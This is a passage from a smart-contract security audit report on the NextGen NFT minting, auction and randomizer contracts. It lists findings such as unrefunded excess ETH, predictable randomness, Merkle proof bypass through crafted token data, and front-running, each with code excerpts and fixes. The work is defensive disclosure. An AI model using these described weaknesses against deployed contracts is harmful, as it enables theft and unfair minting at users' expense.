[[434](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L434), [435](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L435), [436](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L436), [437](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L437), [438](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L438), [464](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L464)]

```solidity
File: smart-contracts/RandomizerRNG.sol

82: 		        (bool success, ) = payable(admin).call{value: balance}("");
```
[[82](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/RandomizerRNG.sol#L82)]

**[a2rocket (NextGen) confirmed](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797585#gistcomment-4797585)**

**[0xsomeone (judge) commented](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797627#gistcomment-4797627):**
> Important and valid.

***

## [M-12] User funds sent in excess are not refunded

*Submitted by [Hound](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a#m-02-user-funds-sent-in-excess-are-not-refunded)*

*Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a). It was declared out of scope for the audit, but is being included here for completeness.*

These functions lack a refund mechanism for excess Ether sent by the caller, resulting in locked funds within the contract. To rectify this, the function should be modified to implement a refund for any surplus amount.

*There are 3 instances of this issue.*

```solidity
File: smart-contracts/MinterContract.sol

233: 		        require(msg.value >= (getPrice(col) * _numberOfTokens), "Wrong ETH");
234: 		        for(uint256 i = 0; i < _numberOfTokens; i++) {
235: 		            uint256 mintIndex = gencore.viewTokensIndexMin(col) + gencore.viewCirSupply(col);
236: 		            gencore.mint(mintIndex, mintingAddress, _mintTo, tokData, _saltfun_o, col, phase);
237: 		        }
238: 		        collectionTotalAmount[col] = collectionTotalAmount[col] + msg.value;

266: 		        require(msg.value >= getPrice(_mintCollectionID), "Wrong ETH");
267: 		        uint256 mintIndex = gencore.viewTokensIndexMin(_mintCollectionID) + gencore.viewCirSupply(_mintCollectionID);
268: 		        // burn and mint token
269: 		        address burner = msg.sender;
270: 		        gencore.burnToMint(mintIndex, _burnCollectionID, _tokenId, _mintCollectionID, _saltfun_o, burner);
271: 		        collectionTotalAmount[_mintCollectionID] = collectionTotalAmount[_mintCollectionID] + msg.value;

361: 		        require(msg.value >= (getPrice(col) * 1), "Wrong ETH");
362: 		        uint256 mintIndex = gencore.viewTokensIndexMin(col) + gencore.viewCirSupply(col);
363: 		        gencore.mint(mintIndex, mintingAddress, ownerOfToken, tokData, _saltfun_o, col, phase);
364: 		        collectionTotalAmount[col] = collectionTotalAmount[col] + msg.value;
```

[[233-238](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L233-L238), [266-271](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L266-L271), [361-364](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L361-L364)]

**[a2rocket (NextGen) confirmed](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797585#gistcomment-4797585)**

**[0xsomeone (judge) commented](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797627#gistcomment-4797627):**
> Important and valid.

***

# Low Risk and Non-Critical Issues

For this audit, 29 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-10-nextgen-findings/issues/747) by **The_Kakers** received the top score from the judge.

*The following wardens also submitted reports: [immeas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1892), [oakcobalt](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1817), [DeFiHackLabs](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1794), [Tadev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/132), [cheatc0d3](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2036), [devival](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1965), [r0ck3tz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1940), [Madalad](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1761), [ZanyBonzy](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1386), [dy](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1332), [Arabadzhiev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1286), [Fulum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1277), [00xSEV](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1201), [lsaudit](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1185), [audityourcontracts](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1136), [alexfilippov314](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1078), [rotcivegaf](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1033), [rishabh](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1008), [SpicyMeatball](https://github.com/code-423n4/2023-10-nextgen-findings/issues/830), [MrPotatoMagic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/743), [xAriextz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/712), [mrudenko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/687), [pipidu83](https://github.com/code-423n4/2023-10-nextgen-findings/issues/588), [tpiliposian](https://github.com/code-423n4/2023-10-nextgen-findings/issues/449), [evmboi32](https://github.com/code-423n4/2023-10-nextgen-findings/issues/235), [oualidpro](https://github.com/code-423n4/2023-10-nextgen-findings/issues/208), [ZdravkoHr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/178), and [0x3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/174).*

# QA Report

## Issue Summary

|ID|Title|
|:----:|:------|
| [01] | `NextGenRandomizerVRF` randomizer uses Goerli `keyHash` |
| [02] | `fulfillRandomWords` sets the token hash as the first fulfilled random number instead of calculating a hash |
| [03] | Insufficient pseudo-randomness is masked under over-complicated implementation |
| [04] | `requestRandomWords()` is marked as `payable` in `NextGenRandomizerRNG` but it can't be called with `value` |
| [05] | `getWord()` returns the same word for different ids |
| [06] | Predictable pseudo-random values should be proposed by trusted roles |
| [07] | `returnHighestBidder()` doesn't update the `highBid` attribute on its calculation |
| [08] | Auction participants will have their funds locked until NFT is claimed |
| [09] | Airdropped minted tokens for auctions should be transferred to a escrow contract |
| [10] | The receiver of the funds from `claimAuction()` should be moved to another function |
| [11] | Use `supportsInterface()` from EIP-165 instead of custom-made checks |
| [12] | `supportsInterface()` is incorrectly implemented on `NextGenCore` |
| [13] | Collection scripts with indexes 999 and 1000 can't be updated |
| [14] | It is not possible to add or remove generative scripts |
| [15] | Merkle nodes can have 64 bytes length, making internal nodes be reinterpreted as leaf values |
| [16] | Merkle proofs from `burnOrSwapExternalToMint()` could be used in `mint()` and vice versa |
| [17] | Lack of check for empty artist signature |
| [18] | Artist can't propose new addresses and percentages |
| [19] | `acceptAddressesAndPercentages()` can be frontrunned by artists to change settings |
| [20] | `acceptAddressesAndPercentages()` can approve addresses and percentages that have not been set |
| [21] | Unnecessary address `payable` conversions |

## [01] `NextGenRandomizerVRF` randomizer uses Goerli `keyHash`

The randomizer will never resolve the words they need to generate the token hash to set for the token id.

### Proof of Concept

`requestRandomWords()` requests words with a `tokenHash` to the `VRFCoordinatorV2` contract: [RandomizerVRF.sol#L54-L55](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol#L54-L55)

That hash is initialized with its Goerli value:

- [RandomizerVRF.sol#L26](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol#L26)
- [Chainlink Docs](https://docs.chain.link/vrf/v2/subscription/supported-networks#goerli-testnet)

The `VRFCoordinatorV2` contract ignores invalid hashes:

```solidity
    // Note we do not check whether the keyHash is valid to save gas.
    // The consequence for users is that they can send requests
    // for invalid keyHashes which will simply not be fulfilled.
```

[VRFCoordinatorV2.sol#L386-L388](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/vrf/VRFCoordinatorV2.sol#L386-L388)

This leads to the `NextGenRandomizerVRF` being unable to resolve the words to set the token hash.

### Recommended Mitigation Steps

Define the `tokenHash` with a variable in the constructor.

## [02] `fulfillRandomWords` sets the token hash as the first fulfilled random number instead of calculating a hash

The sources of entropy for the token hash randomness are greatly reduced.

The implementation expects to consider multiple words (in case it is configured that way), AND the token id for randomness, but it is **only** using the **first** word.

This affects both `RandomizerRNG` and `RandomizerVRF` contracts.

### Proof of Concept

Notice how `fulfillRandomWords()` calculates the token hash as `bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId]))`:

```solidity
    function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
        gencoreContract.setTokenHash(
            tokenIdToCollection[requestToToken[_requestId]],
            requestToToken[_requestId],
->          bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId]))
        );
        emit RequestFulfilled(_requestId, _randomWords);
    }
```

- [RandomizerVRF.sol#L66](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol#L66)
- [RandomizerRNG.sol#L49](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L49)

The problem is that `bytes32()` is only taking the left-most 32 bytes of the abi encoded data, which correspond in this case to the first word in the `_randomWords` array.

Subsequent words (in the case of `RandomizerVRF`) and the `tokenId` (`requestToToken[_requestId]`) will not be considered as a source of entropy for the hash.

In fact, it will set the token hash with the same value as the first fulfilled word.

### Recommendation

Calculate the `keccak256` hash of the packed data. This way the whole pack will be considered for the hash:

```diff
    function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
        gencoreContract.setTokenHash(
            tokenIdToCollection[requestToToken[_requestId]],
            requestToToken[_requestId],
-           bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId]))
+           bytes32(keccak256(abi.encodePacked(_randomWords,requestToToken[_requestId])))
        );
        emit RequestFulfilled(_requestId, _randomWords);
    }
```

## [03] Insufficient pseudo-randomness is masked under over-complicated implementation

`RandomizerNXT` attempts to provide pseudo-randomness via `randoms.randomNumber()` and `randoms.randomWord()` through the `XRandoms` contract to create a token hash:

- [RandomizerNXT.sol#L57](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerNXT.sol#L57)
- [XRandoms.sol#L35-L43](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/XRandoms.sol#L35-L43)

But these functions just provide a false sensation of "more" randomness:

- Both functions rely on `abi.encodePacked(block.prevrandao, blockhash(block.number - 1), block.timestamp)` which will always return the same result for the same block.
- `randomWord()` uses `getWord()` to return a word from a list, but adds no additional value to randomness, as it will always returned a correlated value to its corresponding `id`, and will only be used to create a hash.
- A subset is returned by the operation `% 1000` or `% 100`, which will unnecessarily restrict the values of the random numbers, as they will be used to create a hash.

### Recommendation

Remove the `XRandoms` contract as it adds unnecessary complexity and provides no additional value to the randomness of the result of `calculateTokenHash()` in `RandomizerNXT`.

In case the random words and numbers are valuable, expose them in some way, as it is currently not possible to retrieve them after the token hash is generated. The same applies to [returnIndex()](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/XRandoms.sol#L45-L47), which is useless, as there is no stored or emitted data about the `id` a token used to generate its hash.

## [04] `requestRandomWords()` is marked as `payable` in `NextGenRandomizerRNG` but it can't be called with `value`

The function is marked as `payable` and sends `value` on it:

- [RandomizerRNG.sol#L40](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L40)
- [RandomizerRNG.sol#L42](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L42)

It can only be called via `calculateTokenHash()`, which doesn't provide it with `value`:

[RandomizerRNG.sol#L56](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L56)

### Recommendation

Verify if the function should actually be `payable` and remove the modifier in case it doesn't need it. In case the core contract is supposed to send it some value, modify the calling functions to include the corresponding `value`.

## [05] `getWord()` returns the same word for different ids

`XRandoms::getWord()` is used to return "random" words upon a provided `id`. But it will return the same word for ids `0` and `1`, making the first word have 2x the probability of being returned compared to the others:

```solidity
  if (id==0) {
      return wordsList[id];
  } else {
      return wordsList[id - 1];
  }
```

[XRandoms.sol#L28-L32](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/XRandoms.sol#L28-L32)

The `if` clause is not needed, as the function is expected to be called upon the result of a `% 100` operation: [XRandoms.sol#L41-L42](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/XRandoms.sol#L41-L42), which will return values [0-99] that can safely be used inside the bounds of the words array.

### Recommendation

Replace the `if` statement with:

```diff
-  if (id==0) {
-      return wordsList[id];
-  } else {
-      return wordsList[id - 1];
-  }
+  return wordsList[id]; 
```

## [06] Predictable pseudo-random values should be proposed by trusted roles

`RandomizerNXT` uses predictable pseudo-random values to set the token hash. 

[RandomizerNXT.sol#L57](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerNXT.sol#L57)

This can be used by users to predict the resulting token, and mint the most valuable ones, or with the rarest attributes, taking advantage over other legit users.

### Recommendation

Separate the token hash assignment to a separate function, like the other randomizers do, and only allow trusted roles to execute it to prevent user from abusing it.

## [07] `returnHighestBidder()` doesn't update the `highBid` attribute on its calculation

`returnHighestBidder` may return a different highest bidder to win the auction than the actual highest one.

### Proof of Concept

Note how `highBid` is always `0`, and only the `index` is updated when calculating the highest bidder:

```solidity
    function returnHighestBidder(uint256 _tokenid) public view returns (address) {
->      uint256 highBid = 0;
        uint256 index;
        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i++) {
            if (auctionInfoData[_tokenid][i].bid > highBid && auctionInfoData[_tokenid][i].status == true) {
                index = i;
            }
        }
        if (auctionInfoData[_tokenid][index].status == true) {
                return auctionInfoData[_tokenid][index].bidder;
            } else {
                revert("No Active Bidder");
        }
    }
```

[AuctionDemo.sol#L92](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L92)

Compare it to how `returnHighestBid()` does it:

```solidity
    function returnHighestBid(uint256 _tokenid) public view returns (uint256) {
        uint256 index;
        if (auctionInfoData[_tokenid].length > 0) {
->          uint256 highBid = 0;
            for (uint256 i=0; i< auctionInfoData[_tokenid].length; i++) {
                if (auctionInfoData[_tokenid][i].bid > highBid && auctionInfoData[_tokenid][i].status == true) {
->                  highBid = auctionInfoData[_tokenid][i].bid;
                    index = i;
                }
            }
            if (auctionInfoData[_tokenid][index].status == true) {
                return highBid;
            } else {
                return 0;
            }
        } else {
            return 0;
        }
    }
```

[AuctionDemo.sol#L71](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L71)

### Recommendation

Update the `highBid` value:

```diff
    function returnHighestBidder(uint256 _tokenid) public view returns (address) {
        uint256 highBid = 0;
        uint256 index;
        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i++) {
            if (auctionInfoData[_tokenid][i].bid > highBid && auctionInfoData[_tokenid][i].status == true) {
+               highBid = auctionInfoData[_tokenid][i].bid;
                index = i;
            }
        }
        if (auctionInfoData[_tokenid][index].status == true) {
                return auctionInfoData[_tokenid][index].bidder;
            } else {
                revert("No Active Bidder");
        }
    }
```

## [08] Auction participants will have their funds locked until NFT is claimed

Bidders can't cancel their bid after the auction ends: [AuctionDemo.sol#L125](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L125).

They don't have a method to withdraw their bid if they didn't win either. Also, they have to wait until the winner or an admin claims the NFT to get their bid back [AuctionDemo.sol#L116](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116).

This is an unnecessary lock of users funds.

### Recommendation

Allow non-winning bidders to withdraw their bids after an auction ends.

## [09] Airdropped minted tokens for auctions should be transferred to a escrow contract

Tokens put into auction are first airdropped to a specific `_recipient` address.

```solidity
    function mintAndAuction(address _recipient, ...)
        /// ...
        gencore.airDropTokens(mintIndex, _recipient, _tokenData, _saltfun_o, _collectionID);
```

[MinterContract.sol#L282](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L282)

Then, they are transferred from that address to the auction winner:

```solidity
    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
        /// ...
        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
  ->            IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
                (bool success, ) = payable(owner()).call{value: highestBid}("");
                emit ClaimAuction(owner(), _tokenid, success, highestBid);
            } else if (auctionInfoData[_tokenid][i].status == true) {
                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
            } else {}
        }
    }
```

[AuctionDemo.sol#L113](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L112)

If for any reason the `ownerOfToken` didn't approve the token, move it, its address is compromised, or decided not to transfer it, the whole transaction will revert, preventing any participant to receive their funds.

### Recommendation

Mint the airdropped token to a escrow contract with an approval to be transferred upon a call from the `claimAuction()` function.

## [10] The receiver of the funds from `claimAuction()` should be moved to another function

Despite being a trusted role, if the owner account is compromised, or is moved to a contract that can't accept Ether, the whole `claimAuction()` will be blocked, preventing bidders from getting their bid back, and the auction winner from getting the NFT.

```solidity
    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
        /// ...
        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
                IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
->              (bool success, ) = payable(owner()).call{value: highestBid}("");
                emit ClaimAuction(owner(), _tokenid, success, highestBid);
            } else if (auctionInfoData[_tokenid][i].status == true) {
                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
            } else {}
        }
    }
```

[AuctionDemo.sol#L113](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L113)

### Recommendation

Move the logic to transfer funds from the auction to a separate function.

## [11] Use `supportsInterface()` from EIP-165 instead of custom-made checks

[EIP-165](https://eips.ethereum.org/EIPS/eip-165) defines "a standard method to publish and detect what interfaces a smart contract implements". But the contracts in scope define custom-made checks that are not standard and make integrations more difficult.

Instances:

- `isAdminContract()`
  - Defined in [NextGenAdmins.sol#L83-L85](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenAdmins.sol#L83-L85)
  - Used in:
    - [MinterContract.sol#L455](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L455)
    - [NextGenCore.sol#L323](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L323)
    - [RandomizerVRF.sol#L95](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L95)
    - [RandomizerRNG.sol#L62](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L62)
- `isRandomizerContract()`
    - Defined in:
      - [RandomizerNXT.sol#L62-L64](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerNXT.sol#L62-L64)
      - [RandomizerRNG.sol#L89-L91](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L89-L91)
      - [RandomizerVRF.sol#L105-L107](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L105-L107)
    - Used in [NextGenCore.sol#L171](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L171)
- `isMinterContract()`
  - Defined in [MinterContract.sol#L506-L508](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L506-L508)
  - Used in [NextGenCore.sol#L316](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L316)

### Recommendation

Implement the EIP-165 standard with `supportsInterface()`.

## [12] `supportsInterface()` is incorrectly implemented on `NextGenCore`

The current implementation removes the support of `ERC721Enumerable` for the `NextGenCore` contract, as `super.supportsInterface(interfaceId)` will return the supported interface of the rightmost overridden contract, which is `ERC2981`.

This will break any possible integration that expects the contract to support the interface of `ERC721Enumerable`, including the NFT interface for `ERC721`. This could be for example an NFT lending protocol that expects the NFT contract supports it (in this case `NextGenCore`).

```solidity
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721Enumerable, ERC2981) returns (bool) { 
        return super.supportsInterface(interfaceId); 
    }
```

[NextGenCore.sol#L337-L339](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L337-L339)

### Recommendation

Add the contract support for the `ERC721Enumerable` interface in `supportsInterface()`.

## [13] Collection scripts with indexes `999` and `1000` can't be updated

`NextGenCore::createCollection()` allows the creation of an unbounded array of generative scripts for the collection: [NextGenCore.sol#L138](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L138).

But it doesn't allow updating scripts with index `999` and `1000`, as the `updateCollectionInfo()` function overuses the `index` attribute to conditionally update other collection properties.

[NextGenCore.sol#L240-L252](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L240-L252)

This makes it impossible to update those values, bricking the contract functionality.

### Recommendation

The recommendation would be to refactor the `updateCollectionInfo()` function, so that it doesn't use the `index` for multiple purposes, and allow the update of any element on the scripts array.

Another possible but not recommended solution would be to limit the scripts size to `< 999`.

## [14] It is not possible to add or remove generative scripts

Once the `NextGenCore::createCollection()` sets the generative scripts array, its size can't be changed: [NextGenCore.sol#L138](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L138)

The `updateCollectionInfo()` allows to replace specific scripts, but it doesn't allow to remove them, or add a new one, which makes it more difficult to perform updates; as "deleted" scripts would have to be replaced with an empty value, on multiple transactions. Also newly scripts will have to be "squashed" into existing scripts elements.

### Recommendation

Allow the `updateCollectionInfo()` function to replace the whole scripts array.

## [15] Merkle nodes can have 64 bytes length, making internal nodes be reinterpreted as leaf values

Some specific token data passed to the minting functions may be crafted to exploit this edge behavior of the merkle proof contract and bypass verification.

The node is calculated here:

- [MinterContract.sol#L212](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L212)
- [MinterContract.sol#L216](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L216)
- [MinterContract.sol#L348](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L348)

An explanation can be found on the OpenZeppelin contract:

```solidity
 * WARNING: You should avoid using leaf values that are 64 bytes long prior to hashing, or use a hash function other than keccak256 for hashing leaves.
 * This is because the concatenation of a sorted pair of internal nodes in the merkle tree could be reinterpreted as a leaf value.
```

[MerkleProof.sol#L13-L16](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MerkleProof.sol#L13-L16)

### Recommendation

Add a prefix to the node hash, so that it makes sure the length is always `>` 64 bytes.

## [16] Merkle proofs from `burnOrSwapExternalToMint()` could be used in `mint()` and vice versa

The node in the `mint()` function is calculated as `node = keccak256(abi.encodePacked(_delegator, _maxAllowance, tokData));`. While in `burnOrSwapExternalToMint()` it is `node = keccak256(abi.encodePacked(_tokenId, tokData));`

Since the token data is variable, it can be crafted to make the node from one function match the other. Since both functions use the same merkle root, the proof would be valid.

- [MinterContract.sol#L212](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L212)
- [MinterContract.sol#L216](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L216)
- [MinterContract.sol#L348](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L348)

### Recommendation

Include some identifier if the same merkle root will be used for proofs with different data. Also hash the token data.

## [17] Lack of check for empty artist signature

There is no check to prevent setting the artist signature as empty. Once the signature is set, it can't be changed and will leave the collection with an empty signature: [NextGenCore.sol#L259](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L259)

### Recommendation

Considering checking the artist signature:

```diff
    function artistSignature(uint256 _collectionID, string memory _signature) public {
+       require(bytes(_signature).length > 0);
```

## [18] Artist can't propose new addresses and percentages

Artists are required that the `status` of the `collectionArtistPrimaryAddresses` and `collectionArtistSecondaryAddresses` are set to `false`, in order to propose new addresses and percentages:

- [MinterContract.sol#L381](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L381)
- [MinterContract.sol#L395](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L395)

However, this also means that they can't propose new ones, once these values have been approved. The inconsistency can be seen clearly on how both functions try to update the `status` variable to `false`, despite the fact that it will always be `false` in that situation, as the previous `require` prevents it otherwise.

- [MinterContract.sol#L389](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L389)
- [MinterContract.sol#L403](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L403)

This results in artists that can't propose new addresses and percentages once they were set.

### Recommendation

One solution can be to create a new set of storage variables to save temporary proposed values by the artist, that the admins can then approve or not.

## [19] `acceptAddressesAndPercentages()` can be frontrunned by artists to change settings

`acceptAddressesAndPercentages()` has no way to prevent an artist frontrunning the transaction and changing expected addresses and percentages that the admins have reviewed, and are willing to approve.

[MinterContract.sol#L408](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L408)

This could be considered to break one of the [main invariants of the protocol](https://github.com/code-423n4/2023-10-nextgen/tree/main#main-invariants), as the admin would approve addresses and percentages different than the ones they expected (without noticing):

> Properties that should NEVER be broken under any circumstance:
> - Payments can only be made when royalties are set, the artist proposes addresses and percentages, and an admin approves them.

### Recommendation

One way to solve it is passing a hash that should match the on-chain parameters to be accepted.

## [20] `acceptAddressesAndPercentages()` can approve addresses and percentages that have not been set

There is no check verifying that the addresses and percentages have been proposed by the artist. Nevertheless an admin can "accept" them. Consider checking that the proposed values are not empty.

## [21] Unnecessary address `payable` conversions

Addresses don't need to be converted to `payable` to send them value like `payable(addr).call{value: value}`. This adds unnecessary complexity to the code. Consider removing the `payable` conversions for the following instances:

- [AuctionDemo.sol#L113](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L113)
- [AuctionDemo.sol#L116](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L116)
- [AuctionDemo.sol#L128](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L128)
- [AuctionDemo.sol#L139](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L139)
- [RandomizerRNG.sol#L82](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L82)
- [MinterContract.sol#L434-L438](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L434-L438)
- [MinterContract.sol#L464](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L464)

